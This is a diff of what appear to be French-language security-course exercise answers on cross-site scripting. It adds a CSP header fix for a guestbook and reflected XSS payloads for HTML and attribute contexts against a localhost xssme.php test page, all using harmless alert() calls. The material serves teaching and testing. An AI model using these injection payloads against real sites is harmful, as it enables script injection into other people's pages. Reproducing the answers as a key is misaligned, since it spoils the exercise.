@@ -3,4 +3,16 @@ Mettre le code suivant dans le message :
 <script>alert('xss')</script>
 
 Pour CSP Header, il faut ajouter le code suivant au début de guestbook.php et guestbookleavemessage.php:
-header("Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self';");
+header("Content-Security-Policy: default-src 'self'");
+
+Question 2 :
+htmlcontext :
+http://localhost/xssme.php?htmlcontext=<script>alert('HTML XSS')</script>
+
+attributecontext1 :
+attributecontext1='' onerror=alert('xss')
+http://localhost/xssme.php?attributecontext1=%27%27%20onerror=alert(%27xss%27)
+
+attributecontext2 :
+attributecontext2=" onerror="alert('Double Quote XSS')
+http://localhost/xssme.php?attributecontext2=" onerror="alert('Double Quote XSS')
